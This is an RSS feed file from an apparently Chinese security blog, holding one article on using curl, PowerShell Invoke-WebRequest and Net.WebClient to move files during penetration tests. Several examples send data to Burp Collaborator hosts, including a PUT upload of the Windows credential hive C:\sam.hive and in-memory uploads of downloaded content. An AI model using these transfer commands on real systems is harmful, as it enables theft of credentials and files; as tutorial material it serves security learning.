@@ -1,0 +1,148 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Curl on runshell</title>
+        <link>http://localhost:1313/tags/curl/</link>
+        <description>Recent content in Curl on runshell</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-CN</language>
+        <lastBuildDate>Sun, 15 Jul 2018 14:30:00 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/curl/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>curl详解</title>
+        <link>http://localhost:1313/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/curl%E8%AF%A6%E8%A7%A3/</link>
+        <pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate>
+        
+        <guid>http://localhost:1313/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/curl%E8%AF%A6%E8%A7%A3/</guid>
+        <description>&lt;h2 id=&#34;0x00-前言&#34;&gt;0x00 前言
+&lt;/h2&gt;&lt;p&gt;在渗透测试中经常需要在艰难的环境下执行命令，比如没有回显。为了摆脱困境，经常需要传送文件。curl是一个非常厉害的工具，在绝大多数情况下，linux系统中是存在curl的。此外Windows系统中，powershell4.0及其以后的版本中提供了一个cmlet——&lt;code&gt;Invoke-WebRequest&lt;/code&gt;，其别名之一是curl。所以，简单记录一下curl的用法。&lt;/p&gt;
+&lt;h2 id=&#34;0x01-linux中的curl&#34;&gt;0x01 Linux中的curl
+&lt;/h2&gt;&lt;h3 id=&#34;1http请求&#34;&gt;1.http请求
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;get&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;curl 命令后面直接跟url；使用-H指定请求头，每个-H指定一条header；使用 -o 指定输出到具体文件而不是标准输出。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&amp;amp;sign=5fd0f26e3346e8171e8656caaa42b0fc&amp;#39;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&amp;#39;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Referer: https://admin.college.360.cn/user/student/course/1032&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;post&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;普通表单post，使用-d指定请求体内容。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user=admin&amp;amp;passwd=12345678&amp;#34;&lt;/span&gt; http://127.0.0.1:8080/login
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;文件表单post，使用-F指定需要上传的文件。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl http://oumchi.burpcollaborator.net -F &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;6379.txt=@6379.txt&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 发送出的请求如下：&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# POST / HTTP/1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Host: oumchi.burpcollaborator.net&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# User-Agent: curl/7.58.0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Accept: */*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Content-Length: 1978&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Content-Type: multipart/form-data; boundary=------------------------c9011604f054ee36&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Expect: 100-continue&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# --------------------------c9011604f054ee36&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Content-Disposition: form-data; name=&amp;#34;6379.txt&amp;#34;; filename=&amp;#34;6379.txt&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Content-Type: text/plain&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Starting Nmap 7.60 ( https://nmap.org ) at 2018-09-01 08:25 UTC&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# SYN Stealth Scan Timing: About 3.82% done; ETC: 09:00 (0:34:01 remaining)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# SYN Stealth Scan Timing: About 3.82% done; ETC: 09:00 (0:33:59 remaining)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Stats: 0:01:21 elapsed; 0 hosts completed (64 up), 64 undergoing SYN Stealth Scan&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# SYN Stealth Scan Timing: About 3.83% done; ETC: 09:00 (0:33:55 remaining)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# --------------------------c9011604f054ee36--&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;put&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl http://6biy7e.burpcollaborator.net/ -T ca_setup.exe
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;其它方法测试&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl http://www.example.com -X OPTIONS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl http://www.example.com -X TRACE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2ftp请求&#34;&gt;2.ftp请求
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;get&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl ftp://user:passwd@ftpserver.com:port/path/filename -o filepath
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;put&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl –u name:passwd -T size.mp3 ftp://www.xxx.com/mp3/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;ls(dir)&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl ftp://user:passwd@ftpserver.com:port/path/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;delete&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl –u name:passwd ftp://www.xxx.com/ -X &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DELE mp3/size.mp3&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;3其他&#34;&gt;3.其他
+&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-ba&amp;#39;sh&#34; data-lang=&#34;ba&amp;#39;sh&#34;&gt;-u, --user &amp;lt;user:password&amp;gt; 需要口令验证的http或ftp
+--ntlm 使用htlm认证
+-A, --user-agent &amp;lt;name&amp;gt; 指定请求头中的user-agent字段
+--socks5 &amp;lt;host[:port]&amp;gt; 使用sockes5代理
+-x, --proxy [protocol://]host[:port] 使用http/https代理
+ 
+--post301       Do not switch to GET after following a 301 不跳转301
+--post302       Do not switch to GET after following a 302 不跳转302
+--post303       Do not switch to GET after following a 303 不跳转303
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02-windows中的curl&#34;&gt;0x02 Windows中的curl
+&lt;/h2&gt;&lt;p&gt;powershell 中的curl是&lt;code&gt;Invoke-WebRequest&lt;/code&gt;，它的另一个别名是wget。它是使用&lt;code&gt;-Headers &amp;lt;IDictionary&amp;gt;&lt;/code&gt;来指定请求头，powershell5.x即以前版本可以指定所有请求头，之后的版本UserAgent只能通过&lt;code&gt;-UserAgent &amp;lt;String&amp;gt;&lt;/code&gt;指定。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest [-Uri] &amp;lt;Uri&amp;gt; [-Body &amp;lt;Object&amp;gt;] [-Certificate &amp;lt;X509Certificate&amp;gt;] [-CertificateThumbprint &amp;lt;String&amp;gt;] [-ContentType &amp;lt;String&amp;gt;] [-Credential &amp;lt;PSCredential&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ] [-DisableKeepAlive] [-Headers &amp;lt;IDictionary&amp;gt;] [-InFile &amp;lt;String&amp;gt;] [-MaximumRedirection &amp;lt;Int32&amp;gt;] [-Method { &lt;span style=&#34;color:#66d9ef&#34;&gt;Default&lt;/span&gt; | Get | Head | Post | Put | Delete | Trace | Options
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     | Merge | Patch}] [-OutFile &amp;lt;String&amp;gt;] [-PassThru] [-Proxy &amp;lt;Uri&amp;gt;] [-ProxyCredential &amp;lt;PSCredential&amp;gt;] [-ProxyUseDefaultCredentials] [-SessionVariable &amp;lt;String&amp;gt;] [-Timeou
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    tSec &amp;lt;Int32&amp;gt;] [-TransferEncoding {chunked | compress | deflate | gzip | identity}] [-UseBasicParsing] [-UseDefaultCredentials] [-UserAgent &amp;lt;String&amp;gt;] [-WebSession &amp;lt;Web
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RequestSession&amp;gt;] [&amp;lt;CommonParameters&amp;gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;1http&#34;&gt;1.http
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;get&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;使用-UserAgent 指定UA，使用-Headers指定请求头，使用-OutFile指定输出到文件。若不使用-OutFile，将返回一个HtmlWebResponseObject对象，只在屏幕上显示部分摘要信息，若要显示详细信息可以先将其存入变量，再查看变量content等属性。若只想产看响应体，可用管道符传给&lt;code&gt;write-host&lt;/code&gt;,如&lt;code&gt;curl ifconfig.me | write-host&lt;/code&gt; 。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest -Uri &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://files.college.360.cn/others/Q1NBQS3lhoXnvZHmuJfpgI_mioDmnK8t56ysMTbor74tU01C5Y2P6K6uLnBkZg==?time=1537360082&amp;amp;sign=5fd0f26e3346e8171e8656caaa42b0fc&amp;#34;&lt;/span&gt; -Headers @{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Accept&amp;#34;&lt;/span&gt;=&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*/*&amp;#34;&lt;/span&gt;; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Referer&amp;#34;&lt;/span&gt;=&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://admin.college.360.cn&amp;#34;&lt;/span&gt;} -UserAgent &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&amp;#34;&lt;/span&gt; -OutFile xxx.pdf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;post&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;在使用非get方法时必须用-Method指定请求方法；请求体可以用-body指定一个string或其它类型的对象，也可以从本地文件获取内容作为请求体，使用-infile指定本地文件。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//lti9gf.burpcollaborator.net -Method post -Body &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;user=admin&amp;amp;passwd=12345678&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;put&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;如果服务器支持put方法，可以直接put上传文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//lti9gf.burpcollaborator.net -Method put -InFile &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;‪&lt;/span&gt;C:\sam.hive
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2ftp&#34;&gt;2.ftp
+&lt;/h3&gt;&lt;p&gt;似乎只能下载文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl ftp&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//user&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;password@127.0.0.&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;/s2-&lt;span style=&#34;color:#ae81ff&#34;&gt;057&lt;/span&gt;.py -outFile s2-&lt;span style=&#34;color:#ae81ff&#34;&gt;057&lt;/span&gt;.py
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;0x03-netwebclient&#34;&gt;0x03 net.webclient
+&lt;/h2&gt;&lt;p&gt;在powershell4.0以前没有提供&lt;code&gt;Invoke-WebRequest&lt;/code&gt;,这时我们可以使用Net.WebClient，它是.NET Framework中的一个类。它的功能更加强大。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#ftp下载&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(New-Object System.Net.WebClient).downloadfile(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ftp://admin:admin@172.28.100.68/ppt.txt&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ppt.txt&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#ftp上传&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(New-Object System.Net.WebClient).uploadfile(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ftp://admin:admin@172.28.100.68/ppt1.txt&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ppt.txt&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#http上传&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(New-Object System.Net.WebClient).uploadfile(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://8060wg.burpcollaborator.net&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ppt.txt&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#http下载文件&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(New-Object System.Net.WebClient).downloadfile(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http：//172.28.100.68/ppt.txt&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ppt.txt&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#下载到内存&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$response=(New-Object System.Net.WebClient).downloadstring(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http：//172.28.100.68/ppt.txt&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#75715e&#34;&gt;#得到string&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$response=(New-Object System.Net.WebClient).downloaddata(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http：//172.28.100.68/ppt.txt&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#75715e&#34;&gt;#得到byte[]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#从内存上传&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(New-Object System.Net.WebClient).uploadstring(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://8060wg.burpcollaborator.net&amp;#39;&lt;/span&gt;,$response)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(New-Object System.Net.WebClient).uploaddata(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://8060wg.burpcollaborator.net&amp;#39;&lt;/span&gt;,$response)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#指定请求头&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$mywebclient=(New-Object System.Net.WebClient);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$mywebclient.Headers.Add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Cookie&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; HMACCOUNT=057DAB164B4FC7D1; BAIDUID=3C7BA5C29716B9F251F8BC090E0BF028:FG=1; BIDUPSID=3C7BA5C29716B9F251F8BC090E0BF028; PSTM=1532227383&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$mywebclient.Headers.Add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Referer&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://newtab.firefoxchina.cn/world-tab-index.html&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$mywebclient.downloadstring(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://8060wg.burpcollaborator.net&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+        </item>
+        
+    </channel>
+</rss>
